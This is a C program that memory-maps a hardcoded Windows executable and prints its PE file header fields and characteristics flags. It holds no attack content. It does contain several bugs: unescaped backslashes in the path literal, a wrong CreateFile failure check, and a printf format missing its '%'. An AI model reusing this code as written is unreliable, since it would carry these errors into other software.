int _tmain(int argc, TCHAR* argv[])
{
	PIMAGE_DOS_HEADER pImageDosHeader;
	PIMAGE_NT_HEADERS pImageNtHeaders;
	PIMAGE_FILE_HEADER pImageFileHeader;
	HANDLE hFile;
	HANDLE hMapObject;
	PUCHAR uFileMap;
	//if(argc<2)
	//return -1;
	if (!(hFile = CreateFile(/*argv[1]*/L"C:\Program Files\WindowsApps\Microsoft.YourPhone_1.22082.117.0_x64__8wekyb3d8bbwe\YourPhoneAppProxy.exe", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0)))
		return -1;
	if (!(hMapObject = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL)))
		return -1;
	if (!(uFileMap = (PUCHAR)MapViewOfFile(hMapObject, FILE_MAP_READ, 0, 0, 0)))
		return -1;
	pImageDosHeader = (PIMAGE_DOS_HEADER)uFileMap;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return -1;
	pImageNtHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)uFileMap + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE)
		return -1;
	pImageFileHeader = (PIMAGE_FILE_HEADER) & (pImageNtHeaders->FileHeader);

	printf("Machine:	0x%04X", pImageFileHeader->Machine);
	((pImageFileHeader->Machine == IMAGE_FILE_MACHINE_I386)
		? printf("(I386) \n")
		: printf(" (?) \n"));
	printf("NumberOfSections:	0x%04X\n", pImageFileHeader->NumberOfSections);
	printf("TimeDateStamp:	0x%08X\n", pImageFileHeader->TimeDateStamp);
	printf("PointerToSymbolTable:	0x08X\n", pImageFileHeader->PointerToSymbolTable);
	printf("NumberOfSymbols:	0x%08X\n", pImageFileHeader->NumberOfSymbols);
	printf("SizeOfOptionalHeader:	0x%04X\n", pImageFileHeader->SizeOfOptionalHeader);
	printf("Characteristics:	0x%04X\n", pImageFileHeader->Characteristics);
	viewImageFileCharacteristics(pImageFileHeader->Characteristics);
	UnmapViewOfFile(uFileMap);
	CloseHandle(hMapObject);
	CloseHandle(hFile);
	return 0;
}

void viewImageFileCharacteristics(WORD wCharacteristics)
{
	char szCharacteristics[100];
	memset(szCharacteristics, 0, 100);
	szCharacteristics[0] = '(';
	if (wCharacteristics & 0x0001)
		strcat(szCharacteristics, "RELOCS_STRIPPED|");
	if (wCharacteristics & 0x0002)
		strcat(szCharacteristics, "EXECUTABLE_IMAGE|");
	if (wCharacteristics & 0x0004)
		strcat(szCharacteristics, "LINE_NUMS_STRIPPED|");
	if (wCharacteristics & 0x0100)
		strcat(szCharacteristics, "32BIT_MACHINE|");
	if (wCharacteristics & 0x0200)
		strcat(szCharacteristics, "DEBUG_STRIPPED|");
	if (wCharacteristics & 0x1000)
		strcat(szCharacteristics, "FILE_SYSTEM|");
	if (wCharacteristics & 0x2000)
		strcat(szCharacteristics, "FILE_DLL|");
	szCharacteristics[strlen(szCharacteristics) - 1] = ')';
	szCharacteristics[strlen(szCharacteristics)] = '\0';
	printf("	%s\n", szCharacteristics);
}
```

----------------------------------------

